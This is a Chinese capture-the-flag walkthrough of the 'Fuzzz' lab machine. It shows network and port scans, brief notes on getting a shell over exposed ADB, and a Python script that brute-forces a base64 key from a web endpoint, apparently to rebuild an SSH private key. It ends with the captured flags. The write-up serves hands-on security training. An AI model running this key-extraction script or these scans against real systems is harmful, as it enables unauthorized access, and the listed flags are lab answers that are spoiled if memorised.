---
title: Self-VM Fuzzz复盘
author: LingMj
data: 2025-05-20
categories: [Self-VM]
tags: [upload]
description: 难度-Easy
---


## 网段扫描
```
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d1:27:55, IPv4: 192.168.137.190
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.137.1	3e:21:9c:12:bd:a3	(Unknown: locally administered)
192.168.137.64	a0:78:17:62:e5:0a	Apple, Inc.
192.168.137.73	3e:21:9c:12:bd:a3	(Unknown: locally administered)

9 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.069 seconds (123.73 hosts/sec). 3 responded
```

## 端口扫描

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-20 00:22 EDT
Nmap scan report for fuzzz.hmv.mshome.net (192.168.137.73)
Host is up (0.0045s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.9 (protocol 2.0)
| ssh-hostkey: 
|   256 b6:7b:e7:e5:b3:33:c7:ff:db:63:5d:b3:75:0d:e2:dd (ECDSA)
|_  256 0a:ce:e5:c3:de:50:9c:6d:b7:0d:de:73:b8:6c:28:55 (ED25519)
5555/tcp open  adb     Android Debug Bridge (token auth required)
MAC Address: 3E:21:9C:12:BD:A3 (Unknown)
Service Info: OS: Android; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.00 seconds
```

## 获取webshell

![picture 0](../assets/images/ef3f8dc6a31e8ac7231cd8339d83d2cd64dd4d3e82a1a02c6e969d21d2763a10.png)  
![picture 1](../assets/images/e87a34b88e19c8b916d4d0c1005541d29e5dabac292644c5be77e1d94375ce89.png)  
![picture 2](../assets/images/bb295140c7aad7e10e8507aebc6e0c19671839d18df965d44f7fda0d9a79e9ec.png)  
![picture 3](../assets/images/b905e2ea507cd65e8d23834fcfccb0c3111df53d2d805827375521f997a8f064.png)  
![picture 4](../assets/images/d06e0f6b98db3e783522b3007a776a2891dcdd491df8e4b4f2fda3ad3c7b3b63.png)  

>会自动断就很难受
>

![picture 5](../assets/images/4ff610c8d94188de4daac722028bd0e157872a5a78326bf56489b613409b433e.png)  
![picture 6](../assets/images/3023379c9faee6430b41ec954a94eb228ff1b847a6fc6d3a04beeedac16851e2.png)  

>利用ssh方式
>

## 提权

![picture 7](../assets/images/3023379c9faee6430b41ec954a94eb228ff1b847a6fc6d3a04beeedac16851e2.png)  

>公钥即可
>

![picture 8](../assets/images/30442a53fecdf02ea5b52ce796af91698a9c6d548b092795147140394df06440.png)  

>我以为没80
>

![picture 9](../assets/images/92ca0e65022b50ae6a0a22604a9c21bb39c455e14fd772611ee4efedb6c145c4.png)  
![picture 10](../assets/images/5e4200906801fe75da613aa603f0efd9f4fd6e3fc4e280988c5919d423cf9fdf.png)  
![picture 11](../assets/images/b2cf6617737241cdb8a1880ddcfa6e746cc86402cb0d85109e87309a0231d0c9.png)  

>不行
>

![picture 12](../assets/images/1dde256470e866a89568b8fc44e0118a172b66a65098a5a9ed069ff857a8032a.png)  
![picture 13](../assets/images/40610ad547c58377a8ea72b7364bb53fad8ad51b8908669db4de65ca474319cb.png)  

>没有sh，看来无法socat
>

![picture 14](../assets/images/989b313b998034134fc5a30531e3c101c0c9cdf7d9c822aee2cd635164c43784.png)  
![picture 15](../assets/images/191806fe68d279872171b184e1438d68e2e2efeb8d1051c07bc1088420664026.png)  

>只能打洞了
>

![picture 16](../assets/images/16bd7a71fa6c5a537790e04b9db6734870f4333da6735691b7ba60619b4310e0.png)  
![picture 17](../assets/images/e1a088ea3015d727e6468f9c0118b4c0ce881e48c9f661d5e9e154bf12fb3b35.png)  

>打不了应该是我这个kali坏了之前搞了其他变量环境现在应该全坏了
>

![picture 18](../assets/images/dfb082b743320f4ce304095461b58d6a636cd653ee45d39b0fec89f301c91e24.png)  
![picture 19](../assets/images/43c08ee714af138766c0ac2bf39991c0c923a89ee0c167f7250728194d4478f2.png)  


>这个名字也没有给我fuzz
>

![picture 21](../assets/images/069e7b69a3b19ea6513bb73907320d9d66e8280a22020950dcaf07b09e33f676.png)  

![picture 20](../assets/images/f4939ca89e967ced3dc4933570c82acb18b4a7777e521761efed5ef472248df0.png)  

>好了扔出来了给我kali主机里
>

![picture 22](../assets/images/030e76431a80c96e22b75cfd966077053e7090fb9791d56c028075de70f3a6b7.png)  
![picture 23](../assets/images/932424f33e1e6c65ac99058b30ed224bbbeb3fdae982737346dd1ae3b702c675.png)  

>没有咋整
>

![picture 24](../assets/images/8a4c18237606850bd84b94db1646ea3c88176df96f635dd870546c13375508d8.png)  

>爆破了
>

![picture 25](../assets/images/6f99bbc7fa7af06d22490ebcef18ff0a95a0b4f58eac04781f7e6dc13fc3a7ee.png)  

>不允许啊,端口无法转发，洞打不了基本这个靶机停住了
>

![picture 26](../assets/images/847c8af48e8520d297940ea3fe9e930f93c5664e42428afd6585cbf766e97400.png)  

>不允许转发的话
>

![picture 27](../assets/images/f2808e97b51dec1182573cc8da22671070a520650d1cbc4bf1405052adf36fdb.png)  
![picture 28](../assets/images/1e598b506f9e05dcf40aaf0f90a0d80461e391c948ee51db2219e056cb0dc86f.png)  

>不知道如何访问了，等着了
>

![picture 29](../assets/images/18d1543847f717d748452a1832b81df41689854b43fe61919d8902897db71959.png)  
![picture 30](../assets/images/5865bce2437a483c070ca9557232ba54502e7cb95b32054cec0897ba184d9602.png)  

>不对还有别的方式这个是python上面是php的
>

![picture 31](../assets/images/08a90c431ef9543d41872c487e915edaf916d9af1fef7be200f6621d154e1c47.png)  
![picture 32](../assets/images/172a7d6bbf94b895ebb3daeffceb7c42585ccdf0ad401c08958e45ff6a3dec47.png)  

>没成功,目前有构造：https://uwsgi-docs.readthedocs.io/en/latest/WSGIquickstart.html
>

>但是没有找到app.py写了什么
>

![picture 33](../assets/images/9b9310481a598ce06490ae6ba15c30ea853ad4e140cde69149058fea7051bb54.png)  

>全部为0不知道什么
>

![picture 34](../assets/images/36e1caee56e16498c118bbb707243564ce10ed76d3f17267edb4a0726af6856b.png)  
![picture 35](../assets/images/a2f0fa9dc4a04e3cf2a27390ccadacbb3bd47be62e725634bdc8ee5737d86372.png)  

>不存在
>

![picture 36](../assets/images/cdb6c014a680f4447dc8fdde598b1aba91100e41825c81c44188e12adfefec3c.png)  

![picture 37](../assets/images/8789a972c72221f6ecb649bc1a225271ed964f966dfdd89ac7a586197b21692c.png)  
![picture 38](../assets/images/391b482067e563b1fe4f737d8124981871cda2dcfdf8d6db307d857baf353f9f.png)  

>这玩意我获得提示是fuzz base64
>

![picture 39](../assets/images/0bee522e199f1929cf380290bb22cb3dcfb91947c300c39da33dfa587a334a37.png)  

>有点头疼就一行
>

![picture 40](../assets/images/7bd919ab901e4e68e8d201c9242b38d1f9ed90f4dd8caa06f407590de9402076.png)  

>对我来说1-5手动吧
>

```
import requests
import sys

# 读取base64字符集（注意修复原脚本文件名中的空格）
base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="

key = ""
for _ in range(70):     # 中层循环70次
    found = False
    for char in base64_chars:  # 内层遍历字符
        temp = key + char
        try:
            # 发送请求（注意原脚本curl参数拼写错误）
            response = requests.get(f"http://192.168.137.75:8000/line5/{temp}",timeout=2)
            a = response.text
        except Exception as e:
            a = ""
            
            # 原脚本的逆向逻辑可能需要调整（详见说明）
        if not a:  # 对应原脚本的 [ -z "$a" ]
            key = temp
            found = True
            break  # 跳出字符循环
        
    if not found:  # 本轮未找到有效字符
        break      # 提前结束中层循环

print("Final key:", key)
```

>然后随便匹配一下
>

![picture 41](../assets/images/ccbda7f45ded42518ddfa98799ae33fc25055138ab4ad1ebc5c84f4c45fa856e.png)  

>但是没头我还得找他的头我记得这个作者喜欢ed25519
>

![picture 42](../assets/images/7cef2a0e313087985428f8ef87fdb6528cced34ba3da95dab609bf7a9e4a7372.png)  

>我直接把内容放进去就好了
>

![picture 43](../assets/images/4975d4e597278624d16debe28cb2d740845cb50fdcadec650315772a1d3a9f4f.png)  
![picture 44](../assets/images/4ad6f41578c107726ecb7780669f1899a8d20f0b1f3705344e5490a34cd7790a.png)  


![picture 46](../assets/images/bae5b8898838071e1a9cccf3b4a94d9902df47f77e3697b3501444e84fa5d7a3.png)  

![picture 45](../assets/images/9b789d682ee02017770ae4e119dad05d640fca5f1f50bc89b34a4597c0b8f067.png)  

>结束了
>

>userflag:flag{da39a3ee5e6b4b0d3255bfef95601890afd80709}
>
>rootflag:flag{46a0e055d5db8d82eee6e7eb3ee3ccf64be3fca2}
>